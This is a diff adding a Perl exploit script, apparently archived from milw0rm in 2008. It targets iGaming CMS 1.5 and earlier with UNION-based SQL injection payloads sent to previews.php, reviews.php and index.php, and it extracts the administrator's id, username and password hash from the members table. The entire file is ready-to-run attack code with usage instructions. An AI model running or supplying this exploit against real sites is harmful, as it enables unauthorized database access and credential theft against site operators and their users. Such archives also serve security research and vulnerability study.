@@ -1,0 +1,49 @@
+#!/usr/bin/perl
+# ----------------------------------------------------------
+# iGaming <= 1.5 Multiple Remote SQL Injection Exploit
+# Perl Exploit - Output: id:admin:password
+# Discovered On: 23/09/2008
+# Discovered By: StAkeR - StAkeR[at]hotmail[dot]it
+# Proud To Be Italian 
+# ----------------------------------------------------------
+# Usage: perl exploit.pl http://localhost/iGaming
+# ----------------------------------------------------------
+
+use strict;
+use LWP::UserAgent;
+
+my ($one,$two,$exec,$host,$http,$xxx,$view);
+
+$view  = "'%20union%20select%200,0,1,2,concat(0x25,id,0x3a,pseudo,0x3a,pass,0x25),0,6,7,8%20from%20sp_members%20WHERE%20id='1/*";
+$exec  = "'%20union%20select%201,concat(0x25,id,0x3a,pseudo,0x3a,pass,0x25),3%20from%20sp_members%20where%20id='1/*";
+$host = shift @ARGV;
+$http = new LWP::UserAgent or die $!;
+$http->agent("Mozilla/4.5 [en] (Win95; U)");
+$http->timeout(1);
+                          
+
+if($host !~ /^http:\/\/(.+?)$/)
+{
+  print "[?] iGaming CMS <= 1.5 Multiple Remote SQL Injection Exploit\n";
+  print "[?] Usage: perl $0 http://[path]\n";
+  exit;
+}
+else
+{
+  $one = $http->get($host.'/previews.php?browse='.$exec);
+  $two = $http->get($host.'/reviews.php?browse='.$exec);
+  $xxx = $http->get($host.'/index.php?do=viewarticle&id='.$view);
+  
+  if($one->is_success or $two->is_success or $xxx->is_success)
+  {
+    die "$1\n" if $one->content =~ /%(.+?)%/;
+    die "$1\n" if $two->content =~ /%(.+?)%/;
+    die "$1\n" if $xxx->content =~ /%(.+?)%/;
+  }
+  else
+  {
+    die "[+] Exploit Failed!\n";
+  }
+}  
+
+# milw0rm.com [2008-09-23]
